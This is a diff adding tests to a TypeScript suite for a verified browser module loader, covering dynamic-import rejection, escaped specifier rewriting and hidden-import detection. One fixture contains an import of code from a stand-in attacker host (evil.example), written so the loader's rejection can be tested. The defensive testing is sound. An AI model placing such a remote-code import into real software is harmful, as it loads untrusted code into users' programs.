@@ -163,4 +163,59 @@ describe('browser verified loader — fetch, verify, rewrite, really evaluate', 
     ).toEqual(['./real.mjs', './again.mjs', './lazy.mjs'])
     expect(() => scanModuleSpecifiers(`const f = name => import(name)`)).toThrow(/dynamic import/u)
   })
+
+  it('rewrites and evaluates a quoted literal dynamic import through the verified graph', async () => {
+    const lazy = artifact({
+      'codec.mjs': `export const load = () => import('./lazy.mjs')\n`,
+      'lazy.mjs': `export const answer = 42\n`,
+    })
+    const graph = await loadVerifiedModuleGraph('codec.mjs', lazy.options())
+    const module = (await import(graph.url)) as {
+      load(): Promise<{ readonly answer: number }>
+    }
+    expect((await module.load()).answer).toBe(42)
+    expect(graph.verified).toEqual(['lazy.mjs', 'codec.mjs'])
+  })
+
+  it('cannot hide executable imports behind comment-looking text in strings or regex literals', async () => {
+    const source = `const url = 'https://safe.example/path//segment'
+const pattern = /https?:\/\/example/u
+import 'https://evil.example/extension.mjs'
+export const marker = url + pattern.source
+`
+    expect(scanModuleSpecifiers(source)).toEqual(['https://evil.example/extension.mjs'])
+    const hiddenAbsolute = artifact({ 'codec.mjs': source })
+    await expect(
+      loadVerifiedModuleGraph('codec.mjs', hiddenAbsolute.options()),
+    ).rejects.toMatchObject({
+      code: 'x3.host/execution-load-rejected',
+      message: expect.stringContaining('not in the host module map'),
+    })
+    expect(hiddenAbsolute.fetched).toEqual([`${ROOT}codec.mjs`])
+
+    expect(() =>
+      scanModuleSpecifiers(
+        `const marker = 'text // still a string'; const load = name => import(name)`,
+      ),
+    ).toThrow(/dynamic import/u)
+    expect(() => scanModuleSpecifiers('const load = () => import(`./lazy.mjs`)')).toThrow(
+      /dynamic import/u,
+    )
+  })
+
+  it('rewrites exact parsed spans, including escaped specifiers, without changing lookalike strings', async () => {
+    const entry = String.raw`const label = './a.mjs'
+import { answer } from './\u0061.mjs'
+export { answer, label }
+`
+    const escaped = artifact({
+      'codec.mjs': entry,
+      'a.mjs': 'export const answer = 42\n',
+    })
+    const graph = await loadVerifiedModuleGraph('codec.mjs', escaped.options())
+    const module = (await import(graph.url)) as { answer: number; label: string }
+    expect(module.answer).toBe(42)
+    expect(module.label).toBe('./a.mjs')
+    expect(escaped.fetched).toEqual([`${ROOT}codec.mjs`, `${ROOT}a.mjs`])
+  })
 })
